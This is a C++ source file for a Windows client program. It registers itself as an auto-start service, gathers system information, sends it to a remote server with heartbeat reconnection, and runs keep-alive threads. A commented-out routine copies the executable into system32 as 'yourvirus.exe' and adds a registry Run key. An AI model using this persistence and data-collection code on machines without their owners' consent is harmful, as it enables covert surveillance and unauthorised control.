// ClientCtl.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <stdio.h>
//#include "GetSysInfo.h"
#include <afxwin.h>
#include "AliveKeeper.h"
#include <string>
#include <iostream>
#include <conio.h>
#include "ClientCtl.h"
#include "Service.h"
#include "Logger.h"
#include "InfoSenser.h"
#include "Communicater.h"
#include <direct.h>
#include <stdlib.h>
#include <fstream>
#include <iostream>
#include <exception>


AliveKeeper* AKr;
Logger* logger;
InfoSenser* infosenser;
Communicater* cmtr;
std::string command;
std::string keeperPath("");
std::string thispath("");
extern const char* MY_SERVICE_NAME = "testservice";
bool checkerNeed = true;
bool setterNeed = true;
bool aliveKeeperNeed = true;
bool heart_Beat_Need = true;
bool keep_Alive_Need = true;
SERVICE_TABLE_ENTRY serviceT;

DWORD WINAPI serviceCheckerThread(LPVOID pM);
DWORD WINAPI communicaterThread(LPVOID pM);
DWORD WINAPI keepAliveThread(LPVOID pM);
HANDLE checkerHandle, setterHandle, aliveKeeperHandle;


int main(int argc, char *argv[]) {
	std::cout << argv[0];
	//初始化我的对象
	try {	AKr = new AliveKeeper("MyTestService");	}
	catch (std::string str){	std::cout << str << std::endl;	}

	try { cmtr = new Communicater(); }//确保这玩意首先初始化。。。
	catch (std::string str) { std::cout << str << std::endl; }

	try { logger = new Logger(cmtr); }
	catch (std::string str) { std::cout << str << std::endl; }

	try {	infosenser = new InfoSenser();	}
	catch (std::string str) { std::cout << str << std::endl; }
	//注册AliveKeeper
	AKr->registerService();
	//setterHandle = CreateThread(NULL, 0, serviceCheckerThread, NULL, 0, NULL);
	//注册AliveKeeper完毕
	//_getch();

	//注册服务部分
	logger->log("Main called");
	serviceT.lpServiceName = TEXT("testservice");
	serviceT.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)serviceMain;
	initEntryTable(serviceT);

	std::string filename(argv[0]);
	command = (std::string)"sc create testservice binPath= \"" + filename + "\"" + " start= auto";
	const char *c = command.data();
	std::cout << command << std::endl << c << std::endl;
	system(c);
	//注册服务完毕

	//注册系统信息
	//while (true){
	infosenser->printAll();
	//}
	//注册系统信息完毕
	//初始化标识字典
	init_dic(infosenser);
	//初始化标识字典完毕

	//注册Communicater
	setterHandle = CreateThread(NULL, 0, communicaterThread, NULL, 0, NULL); 

	aliveKeeperHandle = CreateThread(NULL, 0, keepAliveThread, NULL, 0, NULL);//开启keepalive
	//注册Communicater完毕
	_getch();
	/*
	GetSysInfo gSI;
	CString str1, str2;
	DWORD dw1, dw2;
	gSI.GetOSVersion(str1, str2);
	std::wcout << "str1: " << str1.GetBuffer() << std::endl << "str2: " << str2.GetBuffer() << std::endl;
	_getch();*/
}

DWORD WINAPI communicaterThread(LPVOID pM){
	Phaser phaser;
	phaser.set_content(contentDic.string(infosenser->getAll()));
	cmtr->quene.push_back(phaser.finalize());
	cmtr->quene.push_back(Package());
	while (true) {
		while (heart_Beat_Need) {
			_sleep(cmtr->heart_Beat_Delay);
			while (!cmtr->heart_beat()) {
				_sleep(1000);
				try {//失败重新连接
					logger->log("[Alive Keeper]KeepAlive failed, resetting connection!");
					cmtr->connectTillSuccess(cmtr->ip, cmtr->port);
				}
				catch (DWORD dwE) {
					std::cout << "rest failed" << std::endl;
				}
			}
			_sleep(1000);
		}
	}
	return true;
}

DWORD WINAPI keepAliveThread(LPVOID pM) {
	while (true & aliveKeeperNeed) {
		keep_Alive_Need = true;
		_sleep(10000);
	}
	return true;
}

DWORD WINAPI serviceCheckerThread(LPVOID pM){
    while(setterNeed & needRun){
		std::cout<<"thread:"<<GetCurrentThreadId()<<",now checking service"<<std::endl;
		AKr->setterPid=GetCurrentThreadId();

		#ifdef STICKY_MODE
		std::string cmd = keeperPath + "\"" + MY_SERVICE_NAME + "\"";
		const char* c = cmd.data();
		system(c);
		#endif // STICKY_MODE

		Sleep(2000);
	}
	return 0;
}

/*
int addToStartUP() {
	char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	HMODULE GetModH = GetModuleHandle(NULL);
	//得到当前执行文件的全路径
	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
	//得到系统文件所在目录的路径，如c:\windows\system32
	GetSystemDirectory(system, sizeof(system));
	//形成要复制到的全路径，如c:\windows\system32\yourvirus.exe
	strcat(system, "\\yourvirus.exe");
	//自我复制到目标路径
	CopyFile(pathtofile, system, false);

	//写入注册表，以便开机自动运行
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Writing to the Registry Example", 0, REG_SZ, (const unsigned char*)system, sizeof(system));
	RegCloseKey(hKey);
	return 0;
}
*/